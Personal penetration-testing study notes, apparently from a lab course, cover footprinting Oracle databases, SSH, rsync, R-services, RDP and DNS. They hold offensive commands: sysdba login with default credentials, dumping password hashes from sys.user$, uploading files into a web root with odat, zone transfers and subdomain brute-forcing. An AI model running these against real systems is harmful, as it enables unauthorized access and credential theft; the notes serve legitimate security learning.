```

username->scott
password->tiger
SID->XE

[Error Debug ](https://stackoverflow.com/questions/27717312/sqlplus-error-while-loading-shared-libraries-libsqlplus-so-cannot-open-shared)


#### Commands

 [SQLplus commands](https://docs.oracle.com/cd/E11882_01/server.112/e41085/sqlqraa001.htm#SQLQR985)
- list tables
```shell-session
select table_name from all_tables;
```
- list user priv
```shell-session
 select * from user_role_privs;
```

- login as system db admin
```shell-session
sqlplus scott/tiger@10.129.204.235/XE as sysdba
```
- Extract password hashes
```shell-session
select name, password from sys.user$;
```
- Default path of Server files

|**OS**|**Path**|
|---|---|
|Linux|`/var/www/html`|
|Windows|`C:\inetpub\wwwroot`|

- upload files to server db
```shell-session
odat utlfile -s 10.129.204.235 -d XE -U scott -P tiger --sysdba --putFile C:\\inetpub\\wwwroot testing.txt ./testing.txt
```



# Linux Remote Management protocols
# ==SSH==

- Authentication Methods [SEE HERE](https://www.golinuxcloud.com/openssh-authentication-methods-sshd-config/)
```
1. Password authentication
2. Public-key authentication
3. Host-based authentication
4. Keyboard authentication
5. Challenge-response authentication
6. GSSAPI authentication
```


### Public Key Authentication


```
Alice's Computer                Server X
    |                             |
    |--- Request Connection ------>|
    |                             |
    |<--- Send Certificate --------|
    |                             |
    |--- Verify Certificate ------>|
    |                             |
    |                             |
    |--- Send Public Key ---------->|
    |                             |
    |<--- Create and Send Challenge-| 
    |      using Public Key        |
    |                             |
    |--- Decrypt Challenge -------->|
    |      with Private Key        |
    |                             |
    |<--- Verify Solution ---------|
    |                             |
    |--- Connection Established --->|
    |                             |
    |--- Use Connection ----------->
    |                             |
    |--- Close Connection -------->|

```

- **Private Key**: Kept secret on Alice's computer, protected by a passphrase.
- **Public Key**: Shared with Server X, used to create cryptographic challenges.


## Default Configuration

```shell-session
cat /etc/ssh/sshd_config  | grep -v "#" | sed -r '/^\s*$/d'
```

## Dangerous Settings

|**Setting**|**Description**|
|---|---|
|`PasswordAuthentication yes`|Allows password-based authentication.|
|`PermitEmptyPasswords yes`|Allows the use of empty passwords.|
|`PermitRootLogin yes`|Allows to log in as the root user.|
|`Protocol 1`|Uses an outdated version of encryption.|
|`X11Forwarding yes`|Allows X11 forwarding for GUI applications.|
|`AllowTcpForwarding yes`|Allows forwarding of TCP ports.|
|`PermitTunnel`|Allows tunneling.|
|`DebianBanner yes`|Displays a specific banner when logging in.|


## Footprinting the Service

 [ssh-audit](https://github.com/jtesta/ssh-audit)

```shell-session
./ssh-audit.py 10.129.14.132
```


## Rsync

- copy files locally on a given machine and to/from remote hosts files
- using ssh then sync files
- used as mirror and backup
- if file already exist on dest , it just updates  (sync)
- port `873`

`rsync -avz -e ssh /path/to/local/dir user@remote_host:/path/to/remote/dir`


- Pentesting [RSYNC](https://book.hacktricks.xyz/network-services-pentesting/873-pentesting-rsync)


- Probing for Accessible Shares
```shell-session
nc -nv 127.0.0.1 873

(UNKNOWN) [127.0.0.1] 873 (rsync) open
@RSYNCD: 31.0
@RSYNCD: 31.0
#list
dev            	Dev Tools
@RSYNCD: EXIT
```
- Enumerating an Open Share
```shell-session
rsync -av --list-only rsync://127.0.0.1/dev
```


## ==R-Services==

- remote access and command execution between Unix hosts over TCP/IP 
- ports `512`, `513`, and `514`

### Security Flaws

1) **Unencrypted Communication** used before ssh
2) Man-in-the-Middle (MITM) Attacks


 [R-commands](https://en.wikipedia.org/wiki/Berkeley_r-commands) suite consists of the following programs:

- rcp (`remote copy`)
- rexec (`remote execution`)
- rlogin (`remote login`)
- rsh (`remote shell`)
- rstat
- ruptime
- rwho (`remote who`)


#### Abused Commands

| **Command** | **Service Daemon** | **Port** | **Transport Protocol** | **Description**                                                                                                                                                                                                                                                            |
| ----------- | ------------------ | -------- | ---------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `rcp`       | `rshd`             | 514      | TCP                    | Copy a file or directory bidirectionally from the local system to the remote system (or vice versa) or from one remote system to another. It works like the `cp` command on Linux but provides `no warning to the user for overwriting existing files on a system`.        |
| `rsh`       | `rshd`             | 514      | TCP                    | Opens a shell on a remote machine without a login procedure. Relies upon the trusted entries in the `/etc/hosts.equiv` and `.rhosts` files for validation.                                                                                                                 |
| `rexec`     | `rexecd`           | 512      | TCP                    | Enables a user to run shell commands on a remote machine. Requires authentication through the use of a `username` and `password` through an unencrypted network socket. Authentication is overridden by the trusted entries in the `/etc/hosts.equiv` and `.rhosts` files. |
| `rlogin`    | `rlogind`          | 513      | TCP                    | Enables a user to log in to a remote host over the network. It works similarly to `telnet` but can only connect to Unix-like hosts. Authentication is overridden by the trusted entries in the `/etc/hosts.equiv` and `.rhosts` files.                                     |


### **/etc/hosts.equiv** vs **.rhosts**


| File               | Purpose                                     | Location                       | Contents                                                | Example Entry                       |
| ------------------ | ------------------------------------------- | ------------------------------ | ------------------------------------------------------- | ----------------------------------- |
| `/etc/hosts.equiv` | Provides global configuration for all users | System-wide configuration file | Contains a list of trusted hostnames (or IPs) and users | `trustedhost`<br>`trustedhost user` |
| `.rhosts`          | Provides a per-user configuration           | Each user's home directory     | Contains a list of trusted hostnames (or IPs) and users | `trustedhost`<br>`trustedhost user` |

- ===if user in either of these files PAM authentication bypassed===



```shell-session
cat /etc/hosts.equiv

# <hostname> <local username>
pwnbox cry0l1t3
```



#### Footprinting for R-Services

```shell-session
sudo nmap -sV -p 512,513,514 10.0.17.2
```





# Windows Remote management Protocols

## RDP 


1) **Network Firewall**: The network firewall must allow RDP connections (default port 3389).
2) **Server Firewall**: The firewall on the server must also allow incoming RDP connections.
3) **Network Address Translation (NAT)**: If NAT is used (common in home and office networks), additional steps are needed:
    - **Public IP Address**: The remote client needs the public IP address of the NAT router.
    - **Port Forwarding**: The NAT router must forward RDP traffic to the internal IP address of the server.

```
[Remote Client]
       |
       | Public IP: 203.0.113.1 (example)
       |
       v
[Internet]
       |
       v
+-----------------------------+
| [Network Firewall]          |  <-- Allow inbound traffic on port 3389
+-----------------------------+
       |
       v
[NAT Router (Public IP: 203.0.113.1)]
       | 
       | NAT/Port Forwarding: 3389 -> 192.168.1.10:3389
       |
       v
+-----------------------------+
| [Private Network Firewall]  |  <-- Allow inbound traffic on port 3389
+-----------------------------+
       |
       v
[Server (Internal IP: 192.168.1.10)]
       | 
       | RDP Server listening on port 3389
       |
       v
[Desktop Environment]


```


# DNS

DNS servers like Bind9 on Linux use different configuration files:

1. **named.conf**: This file manages general settings (`named.conf.options`), domain-specific configurations (`named.conf.local`), and logging (`named.conf.log`).
2. **Zone Files**: These files define settings for individual domains, specifying things like IP addresses and hostnames.
3. **Reverse Name Resolution Files**: These handle mapping IP addresses to hostnames.

In `named.conf`, global options affect all domains, while zone-specific options only affect specific domains. Options not listed use default values.


- local dns config
```shell-session
cat /etc/bind/named.conf.local
```
- zone files
```shell-session
cat /etc/bind/db.domain.com
```
- Reverse DNS config
```shell-session
cat /etc/bind/db.10.129.14
```


## Dangerous Settings

|**Option**|**Description**|
|---|---|
|`allow-query`|Defines which hosts are allowed to send requests to the DNS server.|
|`allow-recursion`|Defines which hosts are allowed to send recursive requests to the DNS server.|
|`allow-transfer`|Defines which hosts are allowed to receive zone transfers from the DNS server.|
|`zone-statistics`|Collects statistical data of zones.|

---


## Footprinting

- ns query
```shell-session
dig ns inlanefreight.htb @10.129.14.128
```

- version query

```shell-session
 dig CH TXT version.bind 10.129.120.85
```

- Any query
```shell-session
dig any inlanefreight.htb @10.129.14.128
```
inlanefrieght is domain to get info , ip is Name server


- zone transfer
```shell-session
dig axfr inlanefreight.htb @10.129.14.128
```
- zone transfer internal
```shell-session
dig axfr internal.inlanefreight.htb @10.129.14.128
```
- subdomain bruteforcing

```shell-session
for sub in $(cat /opt/useful/SecLists/Discovery/DNS/subdomains-top1million-110000.txt);do dig $sub.inlanefreight.htb @10.129.14.128 | grep -v ';\|SOA' | sed -r '/^\s*$/d' | grep $sub | tee -a subdomains.txt;done
```

```shell-session
dnsenum --dnsserver 10.129.14.128 --enum -p 0 -s 0 -o subdomains.txt -f /opt/useful/SecLists/Discovery/DNS/subdomains-top1million-110000.txt inlanefreight.htb
```
